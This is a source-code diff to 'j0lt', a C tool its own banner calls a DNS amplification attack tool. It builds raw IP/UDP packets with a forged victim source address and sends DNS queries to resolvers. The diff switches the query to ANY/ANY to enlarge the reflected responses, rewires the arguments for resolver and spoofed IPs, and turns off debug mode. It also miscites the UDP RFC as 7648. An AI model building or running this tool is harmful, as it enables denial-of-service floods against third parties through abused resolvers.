@@ -1,14 +1,14 @@
 /*
 * For using:
-* ./j0lt <DST IP> <DST PORT> <SOURCE IP SPOOF> <SOURCE PORT>
+* ./j0lt <RESOLVER IP> <SPOOF_IP> <RESOLVER PORT> <SPOOF PORT>
 *
 * For reading:
 * https://datatracker.ietf.org/doc/html/rfc1700 (NUMBERS)
 * https://datatracker.ietf.org/doc/html/rfc1035 (DNS)
 * https://datatracker.ietf.org/doc/html/rfc1071 (CHECKSUM)
-* https://www.rfc-editor.org/rfc/rfc768.html (UDP)
+* https://www.rfc-editor.org/rfc/rfc7648.html (UDP)
 * https://www.rfc-editor.org/rfc/rfc760 (IP)
-* 
+*
 * For testing:
 * use ctrl + ` to bring up a terminal then $ unshare -rn. This will give you suid to test this
 * sudo tcpdump -X -n udp port 53
@@ -106,12 +106,20 @@ DEFINE_INSERT_FN(word, uint16_t)
 DEFINE_INSERT_FN(dword, uint32_t)
 DEFINE_INSERT_FN(qword, uint64_t)
 #undef DEFINE_INSERT_FN
+    // 0x0000:  4500 0038 c3f0 4000 4011 60a0 0a89 0010  E..8..@.@.`.....
+    // 0x0010:  0a8b 0101 b46b 0035 0024 165a 1337 0000  .....k.5.$.Z.7..
+    // 0x0020:  0001 0000 0000 0000 0667 6f6f 676c 6503  .........google.
+    // 0x0030:  636f 6d00 0001 0001                      com.....
 
+    // 0x0000:  4500 0038 c3f0 4000 4011 60a0 0a89 0010
+    // 0x0010:  0a8b 0101 1388 0035 0024 165a 1337 0000
+    // 0x0020:  0001 0000 0000 0000 0667 6f6f 676c 6503
+    // 0x0030:  636f 6d00 0001 0001
 // IP HEADER VALUES
 #define     IP_IHL_MIN_J0LT 5
 #define     IP_IHL_MAX_J0LT 15
 #define     IP_TTL_J0LT 0x40
-#define     IP_ID_J0LT 0x0dcf
+#define     IP_ID_J0LT 0xc3f0
 // FLAGS
 #define     IP_RF_J0LT 0x8000 // reserved fragment flag
 #define     IP_DF_J0LT 0x4000 // dont fragment flag
@@ -152,19 +160,8 @@ DEFINE_INSERT_FN(qword, uint64_t)
 // END HEADER VALUES
 
 const char* g_ansi = {
-    " Usage: sudo ./j0lt [OPTION]...          \n"
-    "                                         \n"
-    "-d <dst>        : target server          \n"
-    "-p <port>       : target port            \n"
-    "-n <num>        : num UDP packets to send\n"
-    "-r <dns rcrd>   : list of dns records    \n"
-    "-s <dns srv>    : list of dns servers    \n"
-    "-P <dns port>   : dns port (53)          \n"
-    "                                         \n"
-    " w3lc0m3 t0 j0lt                         \n"
-    " a DNS amplification attack tool         \n"
-    "                                         \n"
-    "            the-scientist@rootstorm.com\n\n"
+    "./j0lt <RESOLVER IP> <SPOOF_IP> <RESOLVER PORT> <SPOOF PORT> \n"
+    "the-scientist@rootstorm.com\n\n"
 };
 
 bool
@@ -174,23 +171,26 @@ insert_ip_header(uint8_t** buf, size_t* buflen, IPHEADER* header);
 bool
 insert_dns_header(uint8_t** buf, size_t* buflen, const DNSHEADER* header);
 bool
-insert_dns_question(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class);
+insert_dns_question(void** buf, size_t* buflen,
+        const char* domain, uint16_t query_type, uint16_t query_class);
 void
 pack_dnshdr(DNSHEADER* dnshdr, uint8_t opcode, uint8_t rcode);
 void
-pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, const char* dport, const char* sport, size_t nwritten);
+pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr,
+        const char* resolverport, const char* spoofport, size_t nwritten);
 void
-pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* destip, const char* sourceip, size_t nwritten, size_t udpsz);
+pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr,
+        const char* resolvip, const char* spoofip, size_t nwritten, size_t udpsz);
 bool
 insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len);
 uint16_t
 checksum(const uint16_t* addr, size_t count);
 
-#define DEBUG 1
+#define DEBUG 0
 int
 main(int argc, char** argv)
 {
-    const char* destip, * sourceport, * sourceip, * destport;
+    const char* resolvip, * spoofip, * resolvport, * spoofport;
     uint8_t pktbuf[ NS_PACKETSZ ], datagram[ NS_PACKETSZ ], * curpos;
 
     struct sockaddr_in addr, srcaddr;
@@ -216,10 +216,10 @@ main(int argc, char** argv)
     }
 #endif
 
-    destip = argv[ 1 ];
-    destport = argv[ 4 ];
-    sourceip = argv[ 3 ];
-    sourceport = argv[ 2 ];
+    resolvip = argv[ 1 ];
+    spoofip = argv[ 2 ];
+    resolvport = argv[ 3 ];
+    spoofport = argv[ 4 ];
 
     buflen = NS_PACKETSZ;
     memset(pktbuf, 0, NS_PACKETSZ);
@@ -228,13 +228,13 @@ main(int argc, char** argv)
     status = true;
     pack_dnshdr(&dnsheader, ns_o_query, ns_r_noerror);
     status &= insert_dns_header(&curpos, &buflen, &dnsheader);
-    status &= insert_dns_question(( void** ) &curpos, &buflen, "google.com", ns_t_a, ns_c_in);
+    status &= insert_dns_question(( void** ) &curpos, &buflen, "google.com", ns_t_any, ns_c_any);
     if (status == false)
         goto fail_close;
 
     nwritten = NS_PACKETSZ - buflen;
-    pack_iphdr(&ipheader, &pseudoheader, destip, sourceip, nwritten, sizeof(UDPHEADER));
-    pack_udphdr(&udpheader, &pseudoheader, destport, sourceport, nwritten);
+    pack_iphdr(&ipheader, &pseudoheader, resolvip, spoofip, nwritten, sizeof(UDPHEADER));
+    pack_udphdr(&udpheader, &pseudoheader, resolvport, spoofport, nwritten);
 
     addr.sin_family = AF_INET;
     addr.sin_port = udpheader.uh_dport;
@@ -277,7 +277,8 @@ fail_state:
 }
 
 void
-pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* destip, const char* sourceip, size_t nwritten, size_t udpsz)
+pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr,
+        const char* resolvip, const char* spoofip, size_t nwritten, size_t udpsz)
 {
     memset(iphdr, 0, sizeof(IPHEADER));
     iphdr->version = IP_VER_J0LT;
@@ -287,8 +288,8 @@ pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* destip, const char
     iphdr->frag_off = IP_DF_J0LT;
     iphdr->ttl = IP_TTL_J0LT;
     iphdr->protocol = getprotobyname("udp")->p_proto;
-    iphdr->saddr = htonl(inet_addr(sourceip)); // spoofed ip address to victim
-    iphdr->daddr = htonl(inet_addr(destip));   // name server 
+    iphdr->saddr = htonl(inet_addr(spoofip)); // spoofed ip address to victim
+    iphdr->daddr = htonl(inet_addr(resolvip));   // name server 
 
     memset(pseudohdr, 0, sizeof(PSEUDOHDR));
     pseudohdr->protocol = iphdr->protocol;
@@ -297,14 +298,15 @@ pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* destip, const char
 }
 
 void
-pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, const char* dport, const char* sport, size_t nwritten)
+pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr,
+        const char* resolverport, const char* spoofport, size_t nwritten)
 {
     uint16_t dport_uint16;
     uint16_t sport_uint16;
 
     errno = 0;
-    dport_uint16 = ( uint16_t ) strtol(dport, NULL, 0);
-    sport_uint16 = ( uint16_t ) strtol(sport, NULL, 0);
+    dport_uint16 = ( uint16_t ) strtol(resolverport, NULL, 0);
+    sport_uint16 = ( uint16_t ) strtol(spoofport, NULL, 0);
     if (errno != 0) {
         perror("port error: strtol");
         exit(EXIT_FAILURE);
@@ -378,8 +380,8 @@ insert_udp_header(uint8_t** buf, size_t* buflen, UDPHEADER* header, PSEUDOHDR* p
     uint8_t* pseudoptr = pseudo;
 
     status = true;
-    status &= insert_word(buf, buflen, header->uh_dport);
     status &= insert_word(buf, buflen, header->uh_sport);
+    status &= insert_word(buf, buflen, header->uh_dport);
     status &= insert_word(buf, buflen, header->uh_ulen);
 
     insert_dword(&pseudoptr, &i, pseudoheader->sourceaddr);
@@ -392,7 +394,7 @@ insert_udp_header(uint8_t** buf, size_t* buflen, UDPHEADER* header, PSEUDOHDR* p
 
     // IP4 UDP checksums are ignored. 
     // NOTE: this is not the correct calculation for this value.
-    header->uh_sum = ~header->uh_sum;
+    header->uh_sum = 0x00; //~header->uh_sum;
     status &= insert_word(buf, buflen, header->uh_sum);
 
     return status;
@@ -435,7 +437,8 @@ insert_dns_header(uint8_t** buf, size_t* buflen, const HEADER* header)
 }
 
 bool
-insert_dns_question(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class)
+insert_dns_question(void** buf, size_t* buflen,
+        const char* domain, uint16_t query_type, uint16_t query_class)
 {
     const char* token;
     char* saveptr, qname[ NS_PACKETSZ ];
